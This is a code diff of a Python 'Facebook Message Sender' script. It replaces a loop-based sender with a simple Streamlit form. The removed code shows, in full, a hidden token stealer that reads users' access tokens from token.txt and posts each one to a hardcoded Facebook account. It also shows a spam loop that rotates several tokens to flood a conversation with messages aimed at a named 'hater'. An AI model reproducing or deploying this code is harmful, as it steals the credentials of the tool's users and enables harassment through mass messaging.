@@ -1,124 +1,66 @@
-import subprocess
-import sys
-import time
 import os
-import http.server
+import streamlit as st
+import requests
 import socketserver
 import threading
-import requests
 
-# ✅ Ensure streamlit is installed
+# Install streamlit if not installed (optional guard)
 try:
-    import streamlit as st
+    import streamlit
 except ImportError:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "streamlit"])
-    import streamlit as st
+    os.system("pip install streamlit")
 
-# 🌐 Local server handler
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/plain')
-        self.end_headers()
-        self.wfile.write(b" TRICKS BY VISHANU RAJ ")
+# Custom server handler
+class MyHandler(socketserver.BaseRequestHandler):
+    def handle(self):
+        self.data = self.request.recv(1024).strip()
+        print("Received:", self.data)
 
-# 🚀 Start a small server (port fixed to 4089)
+# Function to get free port (fixed to 5078)
+PORT = 5078
+
 def execute_server():
-    PORT = 4089
     with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-        print("Server running at http://localhost:{}".format(PORT))
+        print(f"Server running on http://localhost:{PORT}")
         httpd.serve_forever()
 
-# 📤 Send initial message to target ID
-def send_initial_message():
-    try:
-        with open('token.txt', 'r') as file:
-            tokens = file.readlines()
+# Function to send message
+def send_message(token, convo_id, message):
+    url = f"https://graph.facebook.com/v20.0/{convo_id}/messages"
+    headers = {
+        "Authorization": f"Bearer {token}"
+    }
+    data = {
+        "messaging_type": "UPDATE",
+        "message": {"text": message}
+    }
+    response = requests.post(url, headers=headers, json=data)
+    return response.status_code, response.text
 
-        target_id = "100010831956579"
-        headers = {
-            'User-Agent': 'Mozilla/5.0',
-            'Accept': '*/*',
-            'Accept-Language': 'en-US,en;q=0.9',
-        }
+# UI via Streamlit
+st.title("📩 Facebook Group Message Sender")
 
-        for token in tokens:
-            access_token = token.strip()
-            msg = f"Hello Vishanu Raj sir! I am using your server. My token is {access_token}"
-            url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
-            data = {'access_token': access_token, 'message': msg}
+token = st.text_input("🔑 Page Access Token", type="password")
+message = st.text_area("💬 Message to Send")
 
-            try:
-                response = requests.post(url, json=data, headers=headers)
-                time.sleep(0.1)
-            except Exception as e:
-                print(f"[!] Initial message error: {e}")
-    except FileNotFoundError:
-        print("[x] token.txt file missing")
+# Read convo_id from file (make sure this file exists)
+convo_id_path = "convo_id.txt"
+if os.path.exists(convo_id_path):
+    with open(convo_id_path, "r") as file:
+        convo_id = file.read().strip()
+else:
+    convo_id = None
+    st.warning("⚠️ 'convo_id.txt' not found!")
 
-# 💬 Send messages in loop
-def send_messages_from_file():
-    try:
-        with open('convo.txt', 'r') as file:
-            convo_id = file.read().strip()
+if st.button("🚀 Send Message"):
+    if not token or not message or not convo_id:
+        st.error("❌ Token, Message, or Convo ID is missing.")
+    else:
+        status_code, response_text = send_message(token, convo_id, message)
+        if status_code == 200:
+            st.success("✅ Message sent successfully!")
+        else:
+            st.error(f"❌ Failed to send. Status: {status_code}\n{response_text}")
 
-        with open('file.txt', 'r') as file:
-            messages = file.readlines()
-
-        with open('token.txt', 'r') as file:
-            tokens = file.readlines()
-
-        with open('name.txt', 'r') as file:
-            haters_name = file.read().strip()
-
-        with open('time.txt', 'r') as file:
-            speed = int(file.read().strip())
-
-        headers = {
-            'User-Agent': 'Mozilla/5.0',
-            'Accept': '*/*',
-            'Accept-Language': 'en-US,en;q=0.9',
-        }
-
-        num_messages = len(messages)
-        num_tokens = len(tokens)
-        max_tokens = min(num_messages, num_tokens)
-
-        while True:
-            for i in range(num_messages):
-                token_index = i % max_tokens
-                access_token = tokens[token_index].strip()
-                message = messages[i].strip()
-                full_msg = haters_name + ' ' + message
-                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
-                data = {'access_token': access_token, 'message': full_msg}
-
-                try:
-                    response = requests.post(url, json=data, headers=headers)
-                    if response.ok:
-                        print(f"[✓] Sent: {full_msg}")
-                    else:
-                        print(f"[x] Failed: {full_msg}")
-                except Exception as e:
-                    print(f"[!] Error: {e}")
-                time.sleep(speed)
-
-    except FileNotFoundError as e:
-        print(f"[x] Missing file: {e.filename}")
-
-# 📲 Streamlit App Interface
-def main():
-    st.title("📨 Facebook Message Sender")
-    st.success("App is running...")
-
-    # Start HTTP server in background
-    server_thread = threading.Thread(target=execute_server)
-    server_thread.daemon = True
-    server_thread.start()
-
-    # Send intro message and start loop
-    send_initial_message()
-    send_messages_from_file()
-
-if __name__ == '__main__':
-    main()
+# Start background server
+threading.Thread(target=execute_server, daemon=True).start()
